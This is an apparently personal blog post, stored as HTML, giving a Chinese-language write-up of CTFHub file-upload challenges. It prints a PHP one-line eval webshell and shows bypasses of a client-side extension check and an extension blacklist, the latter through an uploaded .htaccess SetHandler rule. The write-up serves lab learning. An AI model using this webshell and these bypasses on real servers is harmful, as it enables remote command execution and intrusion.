@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Thou">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+        
+        
+        
+            <link rel="preconnect" href="https://cdn.staticfile.org" crossorigin>
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://blog.txgde.space/2021/10/05/题型总结-ctfhub上传文件/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="原理通过一些手段绕过拦截验证机制上传一句话木马文件(Webshell)到目标服务器并且能成功访问它,然后向其发送请求执行我们要执行的命令. 条件 能够将木马成功上传到目标服务器 能够找到上传的木马文件,并成功访问 一句话木马中的函数能够成功运行  一句话木马示例以PHP为例: &lt;?php @eval($_POST(&quot;shell&quot;)); ?&gt; (@的作用是不显示错误信">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[题型总结 &amp; CTFHub]上传文件">
+<meta property="og:url" content="http://blog.txgde.space/2021/10/05/%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93-ctfhub%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/index.html">
+<meta property="og:site_name" content="童旭光的博客">
+<meta property="og:description" content="原理通过一些手段绕过拦截验证机制上传一句话木马文件(Webshell)到目标服务器并且能成功访问它,然后向其发送请求执行我们要执行的命令. 条件 能够将木马成功上传到目标服务器 能够找到上传的木马文件,并成功访问 一句话木马中的函数能够成功运行  一句话木马示例以PHP为例: &lt;?php @eval($_POST(&quot;shell&quot;)); ?&gt; (@的作用是不显示错误信">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://image.txg2333.top/2021/10/image-2.png">
+<meta property="og:image" content="http://image.txg2333.top/2021/10/image-3.png">
+<meta property="og:image" content="http://image.txg2333.top/2021/10/image-4.png">
+<meta property="og:image" content="http://image.txg2333.top/2021/10/image-5.png">
+<meta property="article:published_time" content="2021-10-05T13:20:05.000Z">
+<meta property="article:modified_time" content="2022-12-13T07:49:25.759Z">
+<meta property="article:author" content="Thou">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="CTFHub">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content=".htaccess">
+<meta property="article:tag" content="一句话木马">
+<meta property="article:tag" content="前端验证">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="无验证">
+<meta property="article:tag" content="题型总结">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://image.txg2333.top/2021/10/image-2.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="http://image.txg2333.top/avatar.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="http://image.txg2333.top/avatar.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="http://image.txg2333.top/avatar.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            [题型总结 &amp; CTFHub]上传文件 -
+        
+        Thouの空间
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/assets/build/styles.css">
+    
+
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fonts/fonts.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fonts/Satoshi/satoshi.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fonts/Chillax/chillax.css">
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="" rel="stylesheet">
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"blog.txgde.space","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":true,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome to Thouの空间","subtitle":{"text":["Coding coding coding!","Let us code!"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/txgde-space","instagram":null,"zhihu":null,"twitter":null,"email":"tongxuguang23@icloud.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"我的":{"icon":"fa-regular fa-user","submenus":{"个人主页":"http://i.txgde.space","Github":"https://github.com/txgde-space"}}},"search":{"enable":true,"preload":true},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"categories":{"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"好累😭","links":{"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2021/10/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Thouの空间
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        我的&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="http://i.txgde.space">个人主页
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/txgde-space">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                我的&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="http://i.txgde.space">个人主页</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/txgde-space">GITHUB</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">[题型总结 &amp; CTFHub]上传文件</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header flex flex-row gap-2 items-center">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="http://image.txg2333.top/avatar.svg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Thou</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2021-10-05 21:20:05</span>
+        <span class="mobile">2021-10-05 21:20:05</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2022-12-13 15:49:25</span>
+            <span class="mobile">2022-12-13 15:49:25</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CTFHub/">CTFHub</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/htaccess/">.htaccess</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81/">前端验证</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%97%A0%E9%AA%8C%E8%AF%81/">无验证</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/">题型总结</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>通过一些手段绕过拦截验证机制上传一句话木马文件(Webshell)到目标服务器并且能成功访问它,然后向其发送请求执行我们要执行的命令.</p>
+<h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul>
+<li>能够将木马成功上传到目标服务器</li>
+<li>能够找到上传的木马文件,并成功访问</li>
+<li>一句话木马中的函数能够成功运行</li>
+</ul>
+<h6 id="一句话木马示例"><a href="#一句话木马示例" class="headerlink" title="一句话木马示例"></a>一句话木马示例</h6><p>以PHP为例: <code>&lt;?php @eval($_POST(&quot;shell&quot;)); ?&gt;</code> (@的作用是不显示错误信息,以免被人发现)</p>
+<h2 id="CTFHub技能树中例题"><a href="#CTFHub技能树中例题" class="headerlink" title="CTFHub技能树中例题"></a>CTFHub技能树中例题</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>直接上传一句话木马即可</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-2.png"
+                      alt="001"
+                ></p>
+<p>bebebe</p>
+<p>访问该文件并通过POST请求发送命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-3.png"
+                      alt="002"
+                ></p>
+<p>经过列出目录命令发现在..&#x2F;里有flag_301433253.php文件</p>
+<p>通过show_source()函数输出flag_301433253.php的内容获取flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-4.png"
+                      alt="003"
+                ></p>
+<p>后面几个例题就主要说说怎么绕过验证</p>
+<h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>打开题目所给链接,查看元素发现以下javascript代码:</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">function</span> <span class="title function_">checkfilesuffix</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> file=<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;file&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file==<span class="string">&quot;&quot;</span>||file==<span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请添加上传文件&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.gif&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> file_suffix=file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(whitelist.<span class="title function_">indexOf</span>(file_suffix) == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;该文件不允许上传&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>这段函数的作用是判断文件后缀名是否为<code>.jpg</code> <code>.png</code> <code>.gif</code> , 不是的话返回<code>false</code>上传失败. 不过好在这个验证程序是写在前端的,我们可以在前端直接对这段函数进行操作.</p>
+<p>我们将这段函数中 <code>alert(&quot;该文件不允许上传&quot;);</code> 后的<code>return false;</code> 改成<code>return true;</code> ,然后复制修改过后的函数到控制台回车运行,如图:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-5.png"
+                      alt="005"
+                ></p>
+<p>然后上传我们的一句话木马,在弹出”该文件不允许上传”后又会弹出”上传成功”.</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>打开题目所给链接,查看元素发现以下被注释掉的javascript代码,根据题目猜想是目标服务器通过.htaccess实现了下列函数的功能</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">empty</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    $name = <span class="title function_">basename</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $ext = <span class="title function_">pathinfo</span>($name)[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    $blacklist = <span class="title function_">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php7&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">in_array</span>($ext, $blacklist)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable constant_">UPLOAD_PATH</span> . $name)) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . <span class="variable constant_">UPLOAD_URL_PATH</span> . $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>函数功能是判断文件后缀名是否在黑名单中,在就输出”文件类型不匹配”.</p>
+<p>做这道题我们首先要了解Apache的<a class="link"   target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mod/core.html#sethandler" >Sethandler指令 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,将其写入到.htaccess文件里可以将匹配到的文件强制使用另一种处理程序处理. 简单来说就是可以把一种文件强制当作另一种文件. 例如本题将使用的绕过代码:</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">shell.jpg</span>&quot;&gt;</span>  </span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这段代码放进.htaccess中可将shell.jpg这个文件当作php文件处理.</p>
+<p>好了,接下来让我们进行绕过工作</p>
+<ol>
+<li>将写好的PHP一句话木马的后缀名改成JPG或者其他允许的文件类型</li>
+<li>创建一个.htaccess的文件(因为Windows不允许创建名字为空的文件,因此具体创建方法可以自行到网上搜索),将以上绕过代码填入其中,保存并上传,因为黑名单中没有.htaccess,可以直接上传.</li>
+<li>最后直接访问<a class="link"   target="_blank" rel="noopener" href="http://xxxxx.com/upload/shell.jpg%E8%80%81%E5%A5%97%E8%B7%AF%E5%8D%B3%E5%8F%AF(%E9%93%BE%E6%8E%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E5%90%8D%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E6%83%85%E5%86%B5%E4%BF%AE%E6%94%B9)" >http://xxxxx.com/upload/shell.jpg老套路即可(链接及文件名根据自己情况修改) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ol>
+<p>目前先写到这,还有几道题有时间再写^ ^</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> [题型总结 &amp; CTFHub]上传文件</li>
+        <li><strong>作者:</strong> Thou</li>
+        <li><strong>创建于
+                :</strong> 2021-10-05 21:20:05</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2022-12-13 15:49:25
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://blog.txgde.space/2021/10/05/题型总结-ctfhub上传文件/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+            本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CTFHub/">#CTFHub</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/htaccess/">#.htaccess</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">#一句话木马</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81/">#前端验证</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">#文件上传</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%97%A0%E9%AA%8C%E8%AF%81/">#无验证</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/">#题型总结</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2021/10/25/2021xju-ctf%E6%96%B0%E7%94%9F%E8%B5%9Bwriteup/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2021XJU CTF新生赛WriteUp</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2021/09/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb_php_include/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">[攻防世界]Web_php_include</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;评论
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdn.staticfile.org/twikoo/1.6.22/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            function loadTwikoo() {
+                twikoo.init({
+                    el: '#twikoo-comment',
+                    envId: 'http://home.txg2333.top:3160',
+                });
+            }
+
+            if ('true') {
+                const loadTwikooTimeout = setTimeout(() => {
+                    loadTwikoo();
+                    clearTimeout(loadTwikooTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadTwikoo);
+            }
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">[题型总结 &amp; CTFHub]上传文件</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E4%B8%AD%E4%BE%8B%E9%A2%98"><span class="nav-text">CTFHub技能树中例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E9%AA%8C%E8%AF%81"><span class="nav-text">无验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="nav-text">前端验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess"><span class="nav-text">.htaccess</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2021</span>
+              -
+            
